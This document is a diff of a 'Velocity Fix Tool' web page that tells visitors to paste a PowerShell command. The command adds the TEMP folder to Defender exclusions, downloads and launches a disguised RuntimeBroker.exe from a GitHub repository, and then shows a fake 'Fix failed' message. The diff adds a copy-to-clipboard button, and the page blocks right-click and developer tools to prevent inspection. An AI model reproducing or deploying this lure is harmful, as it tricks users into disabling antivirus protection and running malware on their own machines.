@@ -15,7 +15,7 @@
             padding: 0;
             position: relative;
             overflow: hidden;
-            -webkit-user-select: none; /* Disable text selection */
+            -webkit-user-select: none;
             -moz-user-select: none;
             -ms-user-select: none;
             user-select: none;
@@ -143,6 +143,23 @@
             border: 1px solid #ff0066;
             box-shadow: 0 0 10px #ff0066;
         }
+        .copy-button {
+            background: linear-gradient(45deg, #ff0066, #ff33aa);
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            box-shadow: 0 0 10px #ff0066;
+            transition: transform 0.2s, box-shadow 0.3s;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        .copy-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px #ff33aa;
+        }
     </style>
 </head>
 <body oncontextmenu="return false;" onkeydown="if(event.keyCode==123) return false;" onmousedown="if(event.button==2) return false;">
@@ -160,34 +177,42 @@
             <img src="https://cdn.discordapp.com/icons/943223926509699072/d08e6e1257804501fa056a967248711e.png?size=4096" alt="Menu Logo" class="menu-logo">
             <h2>Fix Your Issue</h2>
             <p>To resolve your problem, open PowerShell and run this command:</p>
-            <div class="ps-command">
+            <div class="ps-command" id="psCommand">
                 Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://github.com/Wizknaory/clients/raw/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
             </div>
-            <p>Copy it, paste it into PowerShell, and hit Enter. That’s it!</p>
+            <button class="copy-button" onclick="copyToClipboard()">Copy to Clipboard</button>
+            <p>Paste it into PowerShell and hit Enter. That’s it!</p>
         </div>
     </div>
 
     <script>
-        // Disable right-click
         document.oncontextmenu = function() { return false; };
-        // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
         document.onkeydown = function(e) {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85) || (e.ctrlKey && e.keyCode == 83)) {
                 return false;
             }
         };
-        // Disable inspect via mouse
         document.onmousedown = function(e) {
             if (e.button == 2) return false;
         };
-        // Disable opening dev tools programmatically
         window.ondevtoolsopened = function() {
             alert("Dev tools disabled!");
-            window.location.href = "about:blank"; // Redirect to blank page
+            window.location.href = "about:blank";
         };
 
         function openMenu() {
             document.getElementById("fixMenu").style.display = "block";
+        }
+
+        function copyToClipboard() {
+            const commandElement = document.getElementById('psCommand');
+            const commandText = commandElement.innerText.trim(); // Get the clean text
+            navigator.clipboard.writeText(commandText).then(() => {
+                alert("Command copied to clipboard! Paste it into PowerShell and run.");
+            }).catch(err => {
+                console.error("Copy failed:", err);
+                alert("Copy failed. Please select the command manually and copy it.");
+            });
         }
     </script>
 </body>
